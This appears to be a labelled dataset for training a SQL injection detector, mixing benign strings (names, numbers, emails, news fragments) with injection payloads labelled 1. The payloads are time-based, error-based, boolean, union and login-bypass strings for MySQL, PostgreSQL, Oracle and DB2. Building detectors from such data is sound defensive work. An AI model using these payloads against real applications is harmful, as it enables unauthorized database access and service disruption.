Sentence,Label
"-2384'|| ( select 'vhcp' from dual where 1266 = 1266 union all select 1266,1266,1266,1266--",1
hinkel,0
1 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo ) ,1
7081,0
 It &apos;s apparent continuation Israel &apos;s campaign keep arms proliferating Mideast ,0
0052422482512057,0
 The man Lamprechtshausen wanted replace broken heating sensor external facade guest house ,0
'  )  )   or pg_sleep ( __TIME__ ) --,1
"bola, a",0
"c/ duran 52,",0
yu-hung,0
"1 )  where 2781 = 2781 or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"1%"" )  rlike  ( select  ( case when  ( 7736 = 7642 )  then 1 else 0x28 end  )  )   and  ( ""%"" = """,1
"1%"" )  and 2006 = 2006",1
thiele@edifico.kp,0
-8224' )  where 6504 = 6504 or 2461 = 5660,1
"1' )  as mvai where 5856 = 5856 and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  --",1
10817,0
-2504'  )  )   )  or 8723 = 9715,1
" &quot; Once airline verifies tolerance fleet , allow passengers use handheld , lightweight electronic devices tablets , e-readers , smartphones-at altitudes , &quot; FAA said ",0
" There general discontent Single Market , businesses saying costs Brussels regulation outweighed benefits part Europe &apos;s trading area - even 40 per cent large businesses , traditionally pro-European companies , agreed ",0
carraspeo,0
"select count ( * )  from generate_series ( 1,5000000 )  and   (  (  'jloi' = 'jloi",1
8323552403219603,0
" Act singly, already done singly justify now",0
macgregor_poomjai@a2hotels.bj,0
"1"" )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( ""eeye"" = ""eeye",1
perr@pasajesaereosbaratos.pm,0
"1' )  as tuhc where 4018 = 4018 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
"1 )  and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and  ( 6690 = 6690",1
selene,0
ozer,0
11615910j,0
"admin"" or 1 = 1/*",1
"1"" where 2547 = 2547 or sleep ( 5 ) #",1
xingdong,0
turania,0
espinosa de villagonzalo,0
